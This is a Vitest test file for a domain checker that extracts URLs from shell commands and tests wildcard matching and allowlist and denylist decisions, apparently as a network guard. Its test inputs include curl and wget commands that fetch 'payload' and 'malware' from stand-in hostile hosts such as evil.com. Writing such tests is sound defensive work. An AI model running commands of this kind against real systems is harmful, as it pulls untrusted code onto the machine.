/**
 * Domain Checker Tests
 *
 * Tests cover:
 * - URL extraction from command strings
 * - Domain extraction from URLs
 * - Wildcard domain matching
 * - Allowlist checking
 * - Denylist checking
 * - Combined allowlist + denylist
 * - Edge cases: no URLs, multiple URLs, malformed URLs
 */

import { describe, it, expect } from "vitest";
import {
  extractUrls,
  extractDomain,
  matchesDomainPattern,
  checkDomains,
} from "./domain-checker.js";

// ============================================================================
// URL Extraction
// ============================================================================

describe("extractUrls", () => {
  it("extracts a single HTTP URL", () => {
    const urls = extractUrls("curl http://example.com/file.txt");
    expect(urls).toEqual(["http://example.com/file.txt"]);
  });

  it("extracts a single HTTPS URL", () => {
    const urls = extractUrls("wget https://github.com/repo/archive.tar.gz");
    expect(urls).toEqual(["https://github.com/repo/archive.tar.gz"]);
  });

  it("extracts multiple URLs", () => {
    const urls = extractUrls("curl http://a.com && wget https://b.com/file");
    expect(urls).toHaveLength(2);
    expect(urls[0]).toBe("http://a.com");
    expect(urls[1]).toBe("https://b.com/file");
  });

  it("returns empty array when no URLs found", () => {
    const urls = extractUrls("ls -la /tmp");
    expect(urls).toEqual([]);
  });

  it("strips trailing punctuation from URLs", () => {
    const urls = extractUrls("see http://example.com;");
    expect(urls[0]).toBe("http://example.com");
  });

  it("handles URLs with query strings", () => {
    const urls = extractUrls("curl https://api.example.com/data?key=value&page=1");
    expect(urls[0]).toBe("https://api.example.com/data?key=value&page=1");
  });

  it("handles URLs with ports", () => {
    const urls = extractUrls("curl http://localhost:3000/api");
    expect(urls[0]).toBe("http://localhost:3000/api");
  });
});

// ============================================================================
// Domain Extraction
// ============================================================================

describe("extractDomain", () => {
  it("extracts domain from HTTPS URL", () => {
    expect(extractDomain("https://github.com/repo")).toBe("github.com");
  });

  it("extracts domain from HTTP URL", () => {
    expect(extractDomain("http://example.com")).toBe("example.com");
  });

  it("extracts domain from URL with port", () => {
    expect(extractDomain("http://localhost:8080/path")).toBe("localhost");
  });

  it("extracts domain from URL with subdomain", () => {
    expect(extractDomain("https://api.github.com/v3")).toBe("api.github.com");
  });

  it("returns empty string for invalid URL", () => {
    expect(extractDomain("not-a-url")).toBe("");
  });

  it("lowercases the domain", () => {
    expect(extractDomain("https://GITHUB.COM/path")).toBe("github.com");
  });

  it("handles IP addresses", () => {
    expect(extractDomain("http://127.0.0.1:3000/api")).toBe("127.0.0.1");
  });
});

// ============================================================================
// Wildcard Matching
// ============================================================================

describe("matchesDomainPattern", () => {
  it("matches exact domain", () => {
    expect(matchesDomainPattern("github.com", "github.com")).toBe(true);
  });

  it("does not match different domain", () => {
    expect(matchesDomainPattern("evil.com", "github.com")).toBe(false);
  });

  it("matches wildcard subdomain", () => {
    expect(matchesDomainPattern("api.github.com", "*.github.com")).toBe(true);
    expect(matchesDomainPattern("raw.github.com", "*.github.com")).toBe(true);
  });

  it("matches bare domain against wildcard pattern", () => {
    expect(matchesDomainPattern("npmjs.org", "*.npmjs.org")).toBe(true);
  });

  it("does not match unrelated domain against wildcard", () => {
    expect(matchesDomainPattern("evil.com", "*.github.com")).toBe(false);
  });

  it("is case-insensitive", () => {
    expect(matchesDomainPattern("GITHUB.COM", "github.com")).toBe(true);
    expect(matchesDomainPattern("api.github.com", "*.GITHUB.COM")).toBe(true);
  });

  it("does not match partial domain names", () => {
    expect(matchesDomainPattern("notgithub.com", "github.com")).toBe(false);
  });

  it("matches localhost", () => {
    expect(matchesDomainPattern("localhost", "localhost")).toBe(true);
  });

  it("matches IP address", () => {
    expect(matchesDomainPattern("127.0.0.1", "127.0.0.1")).toBe(true);
  });
});

// ============================================================================
// checkDomains — Allowlist
// ============================================================================

describe("checkDomains — allowlist", () => {
  it("allows URLs matching the allowlist", () => {
    const result = checkDomains("curl https://github.com/repo", ["github.com"], []);
    expect(result.allowed).toBe(true);
    expect(result.matchedDomains).toEqual(["github.com"]);
    expect(result.blockedDomains).toEqual([]);
  });

  it("blocks URLs not in the allowlist", () => {
    const result = checkDomains("curl https://evil.com/payload", ["github.com"], []);
    expect(result.allowed).toBe(false);
    expect(result.blockedDomains).toEqual(["evil.com"]);
  });

  it("allows wildcard-matched domains", () => {
    const result = checkDomains("curl https://api.github.com/v3", ["*.github.com"], []);
    expect(result.allowed).toBe(true);
    expect(result.matchedDomains).toEqual(["api.github.com"]);
  });

  it("allows all domains when allowlist is empty", () => {
    const result = checkDomains("curl https://any-domain.com/path", [], []);
    expect(result.allowed).toBe(true);
    expect(result.matchedDomains).toEqual(["any-domain.com"]);
  });
});

// ============================================================================
// checkDomains — Denylist
// ============================================================================

describe("checkDomains — denylist", () => {
  it("blocks domains in the denylist", () => {
    const result = checkDomains("curl https://malware.com/payload", [], ["malware.com"]);
    expect(result.allowed).toBe(false);
    expect(result.blockedDomains).toEqual(["malware.com"]);
  });

  it("denylist overrides allowlist", () => {
    const result = checkDomains(
      "curl https://evil.github.com/bad",
      ["*.github.com"],
      ["evil.github.com"],
    );
    expect(result.allowed).toBe(false);
    expect(result.blockedDomains).toEqual(["evil.github.com"]);
  });

  it("allows non-denied domains when denylist is set", () => {
    const result = checkDomains("curl https://safe.com/file", [], ["malware.com"]);
    expect(result.allowed).toBe(true);
    expect(result.matchedDomains).toEqual(["safe.com"]);
  });
});

// ============================================================================
// checkDomains — Edge Cases
// ============================================================================

describe("checkDomains — edge cases", () => {
  it("returns allowed when command has no URLs", () => {
    const result = checkDomains("ls -la /tmp", ["github.com"], []);
    expect(result.allowed).toBe(true);
    expect(result.blockedDomains).toEqual([]);
    expect(result.matchedDomains).toEqual([]);
  });

  it("handles multiple URLs with mixed results", () => {
    const result = checkDomains(
      "curl https://github.com/file && wget https://evil.com/malware",
      ["github.com"],
      [],
    );
    expect(result.allowed).toBe(false);
    expect(result.matchedDomains).toEqual(["github.com"]);
    expect(result.blockedDomains).toEqual(["evil.com"]);
  });

  it("handles URL with port in allowlist check", () => {
    const result = checkDomains("curl http://localhost:3000/api", ["localhost"], []);
    expect(result.allowed).toBe(true);
    expect(result.matchedDomains).toEqual(["localhost"]);
  });
});
